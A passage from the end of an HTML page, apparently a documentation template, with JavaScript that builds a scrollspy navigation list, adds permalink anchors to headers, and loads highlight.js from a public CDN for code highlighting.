            li.appendChild(a)
            scrollspy.appendChild(li);
          }
        } else {
          scrollspy.parentElement.removeChild(scrollspy)
        }


        /* Add permanent link next to the headers */
        var headers = document.querySelectorAll("h1, h2, h3, h4, h5, h6");

        for(var i = 0; i < headers.length; i++) {
            var a = document.createElement("a");
            a.setAttribute("class", "headerlink");
            a.setAttribute("href", "#" + headers[i].id);
            a.setAttribute("title", "Permanent link")
            a.innerHTML = "#";
            headers[i].appendChild(a);
        }
      }
    </script>

    

    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
  </body>
</html>

